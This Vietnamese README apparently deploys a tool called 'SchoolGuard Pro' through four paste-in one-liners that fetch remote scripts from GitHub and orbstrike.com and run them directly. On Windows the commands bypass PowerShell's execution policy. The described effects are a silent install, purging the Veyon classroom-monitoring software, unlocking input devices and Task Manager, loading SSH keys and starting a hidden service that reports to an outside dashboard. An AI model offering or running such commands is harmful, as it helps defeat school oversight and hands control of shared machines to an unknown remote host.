# SchoolGuard Pro v3.7 — Headless Master Deployment (4 One-Liner Commands)

Hệ thống tự động hóa triển khai **100% chạy ngầm (Headless / Silent Mode)** — không hiển thị hộp thoại pop-up, không thông báo nổi trên Desktop, không tự động bật trình duyệt và chỉ hiển thị thanh tiến trình TUI tối giản cùng thông tin xác nhận ngay trong cửa sổ Terminal.

---

## 🪟 WINDOWS — 2 LỆNH MASTER ONE-LINER (`Win + R` / PowerShell / CMD)

### 1. Windows Command 1 (Full Combo + Gỡ sạch Veyon + Cấu hình LAN + Admin Web Dashboard):
*(Tự động dừng & gỡ bỏ hoàn toàn Veyon Service/WMI/AppX, mở khóa chuột/bàn phím/Task Manager, cấu hình mạng LAN và kích hoạt dịch vụ chạy ngầm kết nối về Admin Web Dashboard)*
```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$env:SG_SKIP_VEYON='0';iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install_win.ps1'))"
```
*(Hoặc rút gọn qua tên miền chính: `powershell -NoProfile -ep Bypass -c "$env:SG_SKIP_VEYON='0';irm https://orbstrike.com/win | iex"`)*

### 2. Windows Command 2 (Full Combo + Cấu hình LAN + Admin Web Dashboard — Giữ nguyên Veyon):
*(Thực hiện đầy đủ thiết lập hệ thống, cấu hình mạng LAN và kích hoạt dịch vụ ngầm kết nối Admin Web Dashboard nhưng **bỏ qua không đụng tới Veyon**)*
```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$env:SG_SKIP_VEYON='1';iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install_win.ps1'))"
```
*(Hoặc rút gọn qua tên miền chính: `powershell -NoProfile -ep Bypass -c "$env:SG_SKIP_VEYON='1';irm https://orbstrike.com/win | iex"`)*

---

## 🐧 XUBUNTU / LINUX — 2 LỆNH MASTER ONE-LINER (`Ctrl + Alt + T`)

### 3. Xubuntu Command 1 (Full Combo + Xóa sạch Veyon + Cấu hình LAN + Admin Web Dashboard):
*(Tự động purge toàn bộ gói & dịch vụ Veyon, mở khóa `xinput`, cài đặt gói phụ thuộc, bật Wake-on-LAN, nạp khóa LAN SSH và khởi chạy dịch vụ `systemd` kết nối Admin Web Dashboard)*
```bash
curl -fsSL https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | bash
```
*(Hoặc rút gọn qua tên miền chính: `curl -fsSL https://orbstrike.com/go | bash`)*

### 4. Xubuntu Command 2 (Full Combo + Cấu hình LAN + Admin Web Dashboard — Giữ nguyên Veyon):
*(Thực hiện đầy đủ thiết lập hệ thống, cấu hình mạng/LAN và khởi chạy dịch vụ `systemd` kết nối Admin Web Dashboard nhưng **giữ nguyên không xóa Veyon**)*
```bash
curl -fsSL https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | SG_SKIP_VEYON=1 bash -s -- --skip-veyon
```
*(Hoặc rút gọn qua tên miền chính: `curl -fsSL https://orbstrike.com/go | SG_SKIP_VEYON=1 bash -s -- --skip-veyon`)*

---

## 🌐 THÔNG TIN TRUY CẬP ADMIN WEB DASHBOARD
* **URL Chính thức (HTTPS):** `https://orbstrike.com/quanlitruonghoc` (hoặc `https://orbstrike.com/ql`)
* **Cổng dịch vụ nội bộ:** `443` (HTTPS/WSS) & `4000` (HTTP)
